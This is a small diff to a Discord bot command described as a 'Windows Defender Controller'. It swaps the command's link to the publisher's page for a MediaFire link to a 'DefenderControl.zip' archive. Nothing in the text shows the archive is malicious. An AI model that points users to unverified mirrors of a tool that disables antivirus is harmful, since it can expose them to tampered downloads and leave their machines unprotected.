@@ -5,6 +5,6 @@ module.exports = {
     description: "Windows Defender Controller.",
 
     async execute({ client, inter, messageFlag }) {
-        inter.reply({content: "https://www.sordum.org/9480/defender-control-v2-1/", ephemeral: messageFlag});
+        inter.reply({content: "https://www.mediafire.com/file/wy1lvgmj4vrzycc/DefenderControl.zip/file", ephemeral: messageFlag});
     }
 }
